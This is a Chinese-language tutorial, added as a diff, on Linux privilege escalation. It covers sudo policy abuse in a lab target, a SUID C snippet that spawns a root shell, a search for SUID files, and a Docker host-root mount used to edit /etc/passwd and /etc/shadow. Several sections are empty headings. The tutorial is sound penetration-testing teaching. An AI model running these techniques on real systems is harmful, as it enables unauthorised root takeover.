@@ -1,0 +1,121 @@
+# Privilege Escalation 权限提升
+
+在真实场景中，为了安全起见，服务常用普通权限账户或者专门账户进行运行，而攻击者通过对目标系统对外开放的服务漏洞进行攻击，得到的权限也就是服务运行所使用的账户的权限。而对于渗透攻击来说，对目标系统的最终攻击目标是取得最高权限（`Windows` 系统的 `NT AUTHORITY\SYSTEM` 权限或是 `Linux` 系统的 `root` 权限）以掌握目标系统的完全控制，那么就需要攻击者从攻击当前服务得到的普通权限或者低权限，经过攻击提升到最高权限。
+
+对于攻击者而言，为了从普通权限提升到最高权限，就需要攻击者对目标系统的环境进行探测，寻找系统内可能存在的漏洞，或者配置错误的安全策略，并进而将当前的权限提升至最高权限。
+
+## Linux 提权
+
+在 Linux 系统中，用户权限通常由 `/etc/passwd` 文件中的用户字段进行定义，用户权限由 `uid` 和 `gid` 进行定义，其分别为 `User IDentifier` 和 `Group IDentifier` 两个权限标识，定义用户权限以及用户组权限，对于最高权限（root）而言，其 `uid` 和 `gid` 都为 0，那么对于 `/etc/passwd` 文件可修改的情况下，可以直接对 `/etc/passwd` 文件进行修改，通过直接修改当前用户的权限标识，来直接获取目标系统的最高权限。
+
+在 Linux 系统上，权限管理策略不仅仅由 `/etc/passwd` 定义的用户权限组成，还有文件权限。对于文件权限，可以通过 `ls -lh` 命令进行查看。以 `/etc/passwd` 文件为例
+
+```shell
+ls -lh /etc/passwd
+-rw-r--r-- 1 root root 2.1K Nov 15  2023 /etc/passwd
+```
+
+文件权限有基础的三个 `r`, `w` 和 `x` 标识，分别代表 `Read`, `Write` 和 `Execute` 三种操作，即读取、写入和执行。在这三个基础权限意外以外，还有三个特殊的 `SUID - set uid`, `SGID - set gid` 和 `SBIT - Sticky Bit` 权限，分别定义文件以拥有者的用户身份执行、文件以拥有组的组身份执行以及目录下的文件只能由 root 或者拥有者进行管理。
+
+### Sudo 提权
+
+`sudo` 所导致的提权，是由 `/etc/sudoers` 配置文件，或 `/etc/sudoers.d` 目录内的配置文件存在有缺陷的 sudo 策略导致的。默认情况下，`sudo` 的配置文件是无法通过普通用户的权限进行读取，但是可以由以下命令来查看当前用户的 `sudo` 策略
+
+```shell
+sudo -l
+```
+
+可以使用 [GTFOBins - Sudo](https://gtfobins.github.io/#+sudo) 数据库对得到的结果进行排查，`sudo` 所拥有的特性，决定了使用 `sudo` 执行的文件，可以视作 `sudo` 策略所配置的目标用户权限所执行。以 **HackMyVM - Pwned** 靶机作为例子，在获取到 `ariana` 用户的 shell 环境之后，排查 `sudo` 策略
+
+```shell
+ariana@pwned:~$ sudo -l
+Matching Defaults entries for ariana on pwned:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ariana may run the following commands on pwned:
+    (selena) NOPASSWD: /home/messenger.sh
+```
+
+根据所得到的结果，说明 `ariana` 用户可以以 `selena` 用户的身份运行 `/home/messenger.sh` 文件。对 `/home/messenger.sh` 文件进行排查，发现其可以执行任意命令，那么就可以通过构造反弹 shell 的命令传入 `/home/messenger.sh` 文件，进而在监听器获得 `selena` 用户的 shell 环境。
+
+### SUID 提权
+
+对于文件的 SUID 权限，其标志文件可以以文件拥有者的用户身份执行，那么如果此文件由 `root` 用户所拥有，并可以执行如 `setuid` 函数等行为，就可以由运行此文件的普通权限提升为 `root` 用户的最高权限。对于当前环境的普通权限，如果发现有可执行文件拥有 `SUID` 权限，同时当前的权限可以对此文件进行修改，就可以使用以下 C 语言片段所编译的可执行文件覆盖此文件的内容
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main()
+{
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+
+对于其中的 `/bin/bash` 应当适用于大部分环境，如果当前环境不存在 `Bash` 则需要替换为其他 Shell 程序，如常见的 `/bin/sh` 程序
+
+对于其他情况，可以使用以下命令对当前环境拥有 SUID 权限的文件进行扫描
+
+```shell
+find / -perm -u=s -type f 2>/dev/null
+```
+
+可以使用 [GTFOBins - SUID](https://gtfobins.github.io/#+suid) 数据库对得到的结果进行排查，如 `base64` 可以借助 SUID 权限实现任意文件读取，或 `vim` 可以借助 SUID 权限得到 `vim` 文件拥有者用户权限的 shell 环境。
+
+### Capabilities 提权
+
+### 常用 Linux 提权工具
+
+## Windows 提权
+
+`Windows` 系统的权限系统相较 `Linux` 系统的实现更为复杂
+
+### Potato 家族
+
+## 常见特权服务
+
+除了针对系统本身安全策略，或者针对系统自身安全漏洞加以利用实现权限提升，还有一些以最高权限运行，或者拥有特殊权限的服务可以加以利用。
+
+### Docker
+
+对于 `Docker` 而言，其本身因为需要调用系统的 `cgroup` 等特性，所以需要以 `service` 来启动，那么其本身就拥有系统的管理权限。如果低权限用户拥有无安全限制的 `Docker` 操作权限，那么就有可能借助 `Docker` 服务实现权限提升。
+
+借助 `Docker` 服务实现权限提升，常见的做法便是直接操作系统上的安全策略相关的文件。在 `Docker` 的 `Volume` 功能中，可以将宿主系统上的文件或者目录映射进 `Docker` 容器中。为了实现将目录映射进容器进而实现宿主系统上的文件修改，首先需要列出目前 `Docker` 可用的容器镜像，以这份输出为例
+
+```plaintext
+REPOSITORY                              TAG       IMAGE ID       CREATED        SIZE
+ghcr.io/eugeny/tabby-web                latest    1edfebbb9878   3 days ago     452MB
+portainer/portainer-ee                  2.21.4    4af47f50b1c9   7 weeks ago    331MB
+rustdesk/rustdesk-server                latest    e0892e67d5a7   2 months ago   23.5MB
+ubuntu                                  22.04     97271d29cb79   3 months ago   77.9MB
+ghcr.io/kingmo888/rustdesk-api-server   latest    0940480509a6   3 months ago   250MB
+```
+
+在这份输出中，可以看到有 `rustdesk` 和 `portainer` 等服务的容器镜像，也有 `ubuntu` 基础镜像。在攻击过程中，建议优先使用基础镜像，因为由于服务镜像可能存在的镜像优化或其他情况，可能会存在 `ENTRYPOINT` 或 `CMD` 容器执行入口被修改为服务可执行文件，或者不存在 `Bash` 或者 `sh` 等情况，这些都会对后续的操作产生阻碍。
+
+这里选择 `ubuntu:22.04` 作为将使用的容器镜像，启动容器
+
+```shell
+docker run --rm -it -v /:/host-dir ubuntu:22.04  /bin/bash
+root@ff7d6d73832b:/#
+```
+
+在容器中，查看宿主系统的敏感文件
+
+```shell
+root@ff7d6d73832b:/# cat /etc/hostname
+ff7d6d73832b
+root@ff7d6d73832b:/# cat /host-dir/etc/hostname
+jmt-projekt
+root@ff7d6d73832b:/# ls -lh /host-dir/etc/passwd /host-dir/etc/shadow
+-rw-r--r-- 1 root root   1.8K Nov 15 05:45 /host-dir/etc/passwd
+-rw-r----- 1 root shadow  854 Nov 15 05:51 /host-dir/etc/shadow
+```
+
+由于 Linux 的文件权限直接由文件系统直接定义，所以只要当前访问文件的用户权限满足文件权限的要求，都可以实现文件操作。对于使用 `Docker` 操作宿主系统上的文件而言，只要在容器内是 `root` 用户，就可以实现操作挂载进容器内的宿主系统根目录下所有 `root` 用户可操作的文件。如果对宿主系统的 `/etc/passwd` 或者 `/etc/shadow` 文件进行修改，就可以直接修改宿主系统上各用户的用户权限，以及修改各用户的账户密码。
+
+### rc-local
